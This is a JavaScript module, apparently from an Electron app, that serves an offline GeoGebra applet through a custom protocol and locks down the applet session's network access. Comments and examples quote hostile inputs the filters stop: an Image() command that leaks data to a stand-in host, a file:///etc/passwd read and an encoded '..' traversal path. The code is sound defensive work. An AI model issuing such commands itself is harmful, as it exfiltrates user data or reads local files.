'use strict';
const fs=require('node:fs');
const path=require('node:path');
const {fileURLToPath}=require('node:url');

/* Protocolo `mesa-ggb:` do GeoGebra offline (#55), instalado SÓ na sessão da view
   do applet (`persist:geogebra`), como o `mesa-activity:` do Chart.js:
     mesa-ggb://app/ggb.html            → o `ggb.html` da Mesa
     mesa-ggb://app/pack/<caminho>      → arquivo de `<pacote>/GeoGebra/<caminho>`
   Mesma origem para a página e para o pacote, então o GWT do applet faz fetch/XHR
   sem CORS. Com o pacote, a sessão também recusa TODO pedido de rede
   (`blockNetwork`): o GeoGebra offline não fala com ninguém. */
const GGB_SCHEME='mesa-ggb';
const GGB_HOST='app';
const PAGE_URL=`${GGB_SCHEME}://${GGB_HOST}/ggb.html`;
const NETWORK_PROTOCOLS=new Set(['http:','https:','ws:','wss:','ftp:']);
const CONTENT_TYPES=new Map(Object.entries({
 '.html':'text/html; charset=utf-8','.js':'text/javascript; charset=utf-8','.mjs':'text/javascript; charset=utf-8',
 '.css':'text/css; charset=utf-8','.json':'application/json; charset=utf-8','.txt':'text/plain; charset=utf-8',
 '.png':'image/png','.gif':'image/gif','.jpg':'image/jpeg','.jpeg':'image/jpeg','.svg':'image/svg+xml','.ico':'image/x-icon',
 '.woff':'font/woff','.woff2':'font/woff2','.ttf':'font/ttf','.otf':'font/otf','.eot':'application/vnd.ms-fontobject',
 '.wasm':'application/wasm','.mp3':'audio/mpeg','.ogg':'audio/ogg',
}));
const notFound=()=>new Response('não encontrado',{status:404});
const typeOf=file=>CONTENT_TYPES.get(path.extname(file).toLowerCase())||'application/octet-stream';

/**
 * Caminho real de um arquivo do pacote, ou `null` se o pedido sair da pasta.
 * @param {string} contentDir `<pacote>/GeoGebra`
 * @param {string} relative parte da URL depois de `/pack/`, ainda codificada
 * @returns {string|null}
 * @example resolvePackFile('/p/GeoGebra','HTML5/5.0/web3d/web3d.nocache.js') // '/p/GeoGebra/HTML5/5.0/web3d/web3d.nocache.js'
 * @example resolvePackFile('/p/GeoGebra','..%2Fpack.json') // null
 */
function resolvePackFile(contentDir,relative){
 let decoded;
 try{decoded=decodeURIComponent(String(relative));}catch{return null;}
 if(!decoded||decoded.includes('\0')||decoded.includes('\\')||decoded.split('/').includes('..'))return null;
 const file=path.resolve(contentDir,decoded);
 try{
  const real=fs.realpathSync(file),base=fs.realpathSync(contentDir);
  if(!real.startsWith(base+path.sep)||!fs.statSync(real).isFile())return null;
  return real;
 }catch{return null;}
}

/**
 * Atende `mesa-ggb:`. `contentDir` e `pageFile` entram por parâmetro.
 * @param {{contentDir:string,pageFile:string}} options
 * @returns {(request:{url:string})=>Promise<Response>}
 */
function createGgbProtocolHandler({contentDir,pageFile}){
 return async request=>{
  let url;
  try{url=new URL(request.url);}catch{return notFound();}
  if(url.protocol!==`${GGB_SCHEME}:`||url.host!==GGB_HOST)return notFound();
  const file=url.pathname==='/ggb.html'?pageFile:url.pathname.startsWith('/pack/')?resolvePackFile(contentDir,url.pathname.slice('/pack/'.length)):null;
  if(!file)return notFound();
  try{return new Response(await fs.promises.readFile(file),{status:200,headers:{'content-type':typeOf(file),'cache-control':'no-store'}});}
  catch{return notFound();}
 };
}

/**
 * Recusa pedidos de rede da sessão; só o esquema local, `data:` e `blob:` passam.
 * @param {{webRequest:{onBeforeRequest:Function}}} session
 * @param {(url:string)=>void} [onBlocked]
 */
function blockNetwork(session,onBlocked=()=>{}){
 session.webRequest.onBeforeRequest((details,callback)=>{
  let blocked;
  try{blocked=NETWORK_PROTOCOLS.has(new URL(details.url).protocol);}catch{blocked=true;}
  if(blocked)onBlocked(details.url);
  callback({cancel:blocked});
 });
}

/**
 * Liga o GeoGebra offline na sessão da view: protocolo próprio e rede fechada.
 * @param {{protocol:{handle:Function},webRequest:object}} session
 * @param {{contentDir:string,pageFile:string,onBlocked?:(url:string)=>void}} options
 */
function installOfflineSession(session,{contentDir,pageFile,onBlocked}){
 session.protocol.handle(GGB_SCHEME,createGgbProtocolHandler({contentDir,pageFile}));
 blockNetwork(session,onBlocked);
}

/* Online: o applet da web precisa do `geogebra.org` (e subdomínios) para
   carregar; o resto é recusado na sessão da view. Um `evalCommand` do tutor
   como `Image("https://sink.exemplo/p.png?d=DADOS")` ou `Image("file:///...")`
   vazaria dados ou leria arquivo local pelo screenshot: com o filtro, o pedido
   nem sai (http(s)/ws(s)/ftp de outro host, `file:` fora do app e qualquer
   protocolo estranho caem no `onBlocked`). `data:`/`blob:` passam (assets
   internos do applet); o `mesa-ggb:` passa (inoffensivo sem o pacote). */

/**
 * O pedido pode sair da sessão da view online?
 * @param {string} raw URL pedida
 * @param {string} [appDir] pasta do app: o único `file:` liberado é o de dentro dela
 * @returns {boolean}
 * @example ggbOnlineAllowed('https://www.geogebra.org/apps/deployggb.js', '/app/desk') // true
 * @example ggbOnlineAllowed('http://127.0.0.1:9/p.png', '/app/desk') // false
 * @example ggbOnlineAllowed('file:///etc/passwd', '/app/desk') // false
 */
function ggbOnlineAllowed(raw,appDir=''){
 let parsed;
 try{parsed=new URL(String(raw));}catch{return false;}
 const protocol=parsed.protocol.toLowerCase();
 if(protocol==='data:'||protocol==='blob:')return true;
 if(protocol==='http:'||protocol==='https:'||protocol==='ws:'||protocol==='wss:'||protocol==='ftp:')return /(^|\.)geogebra\.org$/i.test(parsed.hostname);
 if(protocol===`${GGB_SCHEME}:`)return true;
 if(protocol!=='file:'||!appDir)return false;
 let file,base;
 try{file=fs.realpathSync(fileURLToPath(raw));}catch{return false;}
 try{base=fs.realpathSync(appDir);}catch{return false;}
 return file===base||file.startsWith(base+path.sep);
}

/**
 * Fecha a rede da sessão da view online: só `geogebra.org` e o app.
 * @param {{webRequest?:{onBeforeRequest:Function}}} session
 * @param {{appDir?:string,onBlocked?:(url:string)=>void}} [options]
 * @returns {boolean} false quando a sessão não tem `webRequest`
 */
function installOnlineSession(session,{appDir='',onBlocked}={}){
 if(!session||!session.webRequest||typeof session.webRequest.onBeforeRequest!=='function')return false;
 session.webRequest.onBeforeRequest((details,callback)=>{
  let ok;
  try{ok=ggbOnlineAllowed(details.url,appDir);}catch{ok=false;}
  if(!ok&&typeof onBlocked==='function'){try{onBlocked(details.url);}catch{/* o log não pode derrubar o filtro */}}
  callback({cancel:!ok});
 });
 return true;
}

module.exports={GGB_SCHEME,GGB_HOST,PAGE_URL,resolvePackFile,createGgbProtocolHandler,blockNetwork,installOfflineSession,ggbOnlineAllowed,installOnlineSession};
